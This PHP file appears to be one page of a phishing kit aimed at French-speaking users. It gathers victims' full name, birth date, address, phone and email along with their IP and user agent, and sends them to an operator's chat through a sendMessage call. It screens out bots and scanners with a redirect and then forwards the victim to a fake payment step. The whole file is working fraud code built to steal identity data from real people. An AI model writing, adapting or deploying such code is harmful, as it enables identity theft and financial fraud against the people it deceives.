<?php

session_start();
include('../../../antibots.php');
include('../../../config.php');
include('../../../app/functions.php');
include('../../../common/subb_includes.php');

if ($_SESSION['bot'] == '1') {
if ($_POST) {

    if (!empty($_POST['fname'] & $_POST['dob'] & $_POST['address'] & $_POST['zip'] & $_POST['city'] || $_POST['phone'])) {

        $_SESSION['fname'] = htmlspecialchars($_POST['fname']);
        $_SESSION['lname'] = htmlspecialchars($_POST['lname']);
        $_SESSION['dob'] = htmlspecialchars($_POST['dob']);
        $_SESSION['address'] = htmlspecialchars($_POST['address']);
        $_SESSION['zip'] = htmlspecialchars($_POST['zip']);
        $_SESSION['city'] = htmlspecialchars($_POST['city']);
        $_SESSION['phone'] = htmlspecialchars($_POST['phone']);
        $_SESSION['email'] = htmlspecialchars($_POST['email']);
        $_SESSION['name'] = "{$_SESSION['fname']} {$_SESSION['lname']}";

$text = "
★━━━━━━━ 👤 ━━━━━━━★

👤 Nom complet ➟ {$_SESSION['name']}
👤 Date de naissance ➟ {$_SESSION['dob']}
👤 Adresse ➟ {$_SESSION['address']}
👤 Code postal ➟ {$_SESSION['zip']}
👤 Ville ➟ {$_SESSION['city']}
👤 Numéro de téléphone ➟ {$_SESSION['phone']}
👤 Adresse e-mail ➟ {$_SESSION['email']}

★━━━━━━━ 🌐 ━━━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}
"; 

    sendMessage($chat_id, $text); 

    $_SESSION['load'] = 'payment';

    $_SESSION['billing-error'] = "";
    header('location: ../../loading/');

    } else {
        $_SESSION['billing-error'] = "Identifiant ou mot de passe invalide" ;
        header('location: ../');
    }

} else {
    $_SESSION['billing-error'] = "Requête invalide" ;
    header('location: ../');
}
} else {
    header('location: https://google.com/404');
}